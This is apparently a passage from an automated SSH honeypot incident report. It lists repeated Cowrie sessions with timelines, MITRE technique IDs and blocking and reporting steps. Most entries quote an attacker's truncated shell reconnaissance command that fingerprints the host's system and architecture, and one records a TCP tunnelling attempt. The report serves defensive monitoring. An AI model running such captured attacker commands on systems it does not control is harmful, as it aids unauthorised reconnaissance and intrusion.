| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:22:20` | `cowrie.session.connect` |
| `2026-09-04 11:22:21` | `cowrie.client.version` |
| `2026-09-04 11:22:21` | `cowrie.client.kex` |
| `2026-09-04 11:22:22` | `cowrie.login.success` |
| `2026-09-04 11:22:24` | `cowrie.session.params` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.success` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.command.input` |
| `2026-09-04 11:22:24` | `cowrie.log.closed` |
| `2026-09-04 11:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7625dba485a5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:23 |
| **Last Seen** | 2026-09-04 11:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:23:38` | `cowrie.session.connect` |
| `2026-09-04 11:23:38` | `cowrie.client.version` |
| `2026-09-04 11:23:38` | `cowrie.client.kex` |
| `2026-09-04 11:23:40` | `cowrie.login.success` |
| `2026-09-04 11:23:42` | `cowrie.session.params` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.success` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:42` | `cowrie.command.input` |
| `2026-09-04 11:23:43` | `cowrie.log.closed` |
| `2026-09-04 11:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1773c990ada

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:24 |
| **Last Seen** | 2026-09-04 11:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:24:55` | `cowrie.session.connect` |
| `2026-09-04 11:24:55` | `cowrie.client.version` |
| `2026-09-04 11:24:55` | `cowrie.client.kex` |
| `2026-09-04 11:24:57` | `cowrie.login.success` |
| `2026-09-04 11:24:58` | `cowrie.session.params` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.success` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:58` | `cowrie.command.input` |
| `2026-09-04 11:24:59` | `cowrie.log.closed` |
| `2026-09-04 11:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d3deabd1b4b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:26 |
| **Last Seen** | 2026-09-04 11:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:26:15` | `cowrie.session.connect` |
| `2026-09-04 11:26:15` | `cowrie.client.version` |
| `2026-09-04 11:26:15` | `cowrie.client.kex` |
| `2026-09-04 11:26:17` | `cowrie.login.success` |
| `2026-09-04 11:26:18` | `cowrie.session.params` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.success` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:18` | `cowrie.command.input` |
| `2026-09-04 11:26:19` | `cowrie.log.closed` |
| `2026-09-04 11:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b914a15bb2d8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:27 |
| **Last Seen** | 2026-09-04 11:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:27:35` | `cowrie.session.connect` |
| `2026-09-04 11:27:36` | `cowrie.client.version` |
| `2026-09-04 11:27:36` | `cowrie.client.kex` |
| `2026-09-04 11:27:37` | `cowrie.login.success` |
| `2026-09-04 11:27:39` | `cowrie.session.params` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.success` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.command.input` |
| `2026-09-04 11:27:39` | `cowrie.log.closed` |
| `2026-09-04 11:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ab80cd3586

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 11:28 |
| **Last Seen** | 2026-09-04 11:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:28:40` | `cowrie.session.connect` |
| `2026-09-04 11:28:40` | `cowrie.client.version` |
| `2026-09-04 11:28:40` | `cowrie.client.kex` |
| `2026-09-04 11:28:41` | `cowrie.login.success` |
| `2026-09-04 11:28:41` | `cowrie.direct-tcpip.request` |
| `2026-09-04 11:28:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 11:28:42` | `cowrie.direct-tcpip.data` |
| `2026-09-04 11:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf45a8bd497

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:30 |
| **Last Seen** | 2026-09-04 11:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:30:07` | `cowrie.session.connect` |
| `2026-09-04 11:30:07` | `cowrie.client.version` |
| `2026-09-04 11:30:07` | `cowrie.client.kex` |
| `2026-09-04 11:30:09` | `cowrie.login.success` |
| `2026-09-04 11:30:10` | `cowrie.session.params` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.success` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.command.input` |
| `2026-09-04 11:30:10` | `cowrie.log.closed` |
| `2026-09-04 11:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f72d679b340

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:31 |
| **Last Seen** | 2026-09-04 11:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:31:28` | `cowrie.session.connect` |
| `2026-09-04 11:31:28` | `cowrie.client.version` |
| `2026-09-04 11:31:28` | `cowrie.client.kex` |
| `2026-09-04 11:31:30` | `cowrie.login.success` |
| `2026-09-04 11:31:31` | `cowrie.session.params` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.success` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.command.input` |
| `2026-09-04 11:31:31` | `cowrie.log.closed` |
| `2026-09-04 11:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e12a0cdbd47

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:33 |
| **Last Seen** | 2026-09-04 11:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:33:03` | `cowrie.session.connect` |
| `2026-09-04 11:33:03` | `cowrie.client.version` |
| `2026-09-04 11:33:03` | `cowrie.client.kex` |
| `2026-09-04 11:33:05` | `cowrie.login.success` |
| `2026-09-04 11:33:06` | `cowrie.session.params` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.success` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.command.input` |
| `2026-09-04 11:33:06` | `cowrie.log.closed` |
| `2026-09-04 11:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c50e0b216d3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:34 |
| **Last Seen** | 2026-09-04 11:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:34:18` | `cowrie.session.connect` |
| `2026-09-04 11:34:18` | `cowrie.client.version` |
| `2026-09-04 11:34:18` | `cowrie.client.kex` |
| `2026-09-04 11:34:19` | `cowrie.login.success` |
| `2026-09-04 11:34:20` | `cowrie.session.params` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.success` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:20` | `cowrie.command.input` |
| `2026-09-04 11:34:21` | `cowrie.log.closed` |
| `2026-09-04 11:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ed2e0468fc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:35 |
| **Last Seen** | 2026-09-04 11:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:35:33` | `cowrie.session.connect` |
| `2026-09-04 11:35:33` | `cowrie.client.version` |
| `2026-09-04 11:35:33` | `cowrie.client.kex` |
| `2026-09-04 11:35:35` | `cowrie.login.success` |
| `2026-09-04 11:35:36` | `cowrie.session.params` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.success` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.command.input` |
| `2026-09-04 11:35:36` | `cowrie.log.closed` |
| `2026-09-04 11:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dbfcf5f00ce

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:36 |
| **Last Seen** | 2026-09-04 11:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:36:47` | `cowrie.session.connect` |
| `2026-09-04 11:36:47` | `cowrie.client.version` |
| `2026-09-04 11:36:47` | `cowrie.client.kex` |
| `2026-09-04 11:36:48` | `cowrie.login.success` |
| `2026-09-04 11:36:49` | `cowrie.session.params` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.success` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.command.input` |
| `2026-09-04 11:36:49` | `cowrie.log.closed` |
| `2026-09-04 11:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb4850c850e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:38 |
| **Last Seen** | 2026-09-04 11:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:38:04` | `cowrie.session.connect` |
| `2026-09-04 11:38:04` | `cowrie.client.version` |
| `2026-09-04 11:38:04` | `cowrie.client.kex` |
| `2026-09-04 11:38:05` | `cowrie.login.success` |
| `2026-09-04 11:38:06` | `cowrie.session.params` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
